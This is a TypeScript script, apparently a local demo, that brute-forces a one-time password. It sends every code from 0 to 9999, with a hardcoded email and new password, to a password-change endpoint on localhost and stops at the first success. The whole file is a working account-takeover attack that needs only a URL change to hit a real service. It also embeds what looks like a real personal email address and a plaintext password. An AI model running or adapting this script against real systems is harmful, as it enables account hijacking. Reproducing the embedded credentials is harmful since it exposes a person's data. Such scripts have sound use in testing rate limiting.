import axios from "axios";

interface UserCredentials {
  email: string;
  otp: string;
  password: string;
}

async function main({ email, password, otp }: UserCredentials) {
  try {
    const response = await axios.post(
      "http://localhost:3000/otpauth",
      {
        email,
        password,
        otp,
      },
      {
        headers: {
          "Content-Type": "application/json",
        },
      }
    );
    console.log(response.status)
    if (response.status === 200) {
      console.log(`Password has changed ${password} with OTP: ${otp}`);
        process.exit(0);
      return
    }
  } catch (error) {
    // console.error(`Error with OTP ${otp}:`, error);
  }
}

async function sendRequestsInBatches(batchSize: number) {
  for (let i = 0; i < 10000; i++) {
    await main({
      email: "kumashravan5@gmail.com",
      password: "kartdefbueif@123",
      otp: i.toString(),
    });
    
    
    // Optionally: Add delay between requests to avoid overwhelming the server
    if ((i + 1) % batchSize === 0) {
      // console.log(`Batch of ${batchSize} requests completed.`);
      await new Promise((resolve) => setTimeout(resolve, 1000)); // 5 seconds delay
    }
  }
}

// Call the function with a reasonable batch size
sendRequestsInBatches(1000); // Adjust batch size as needed
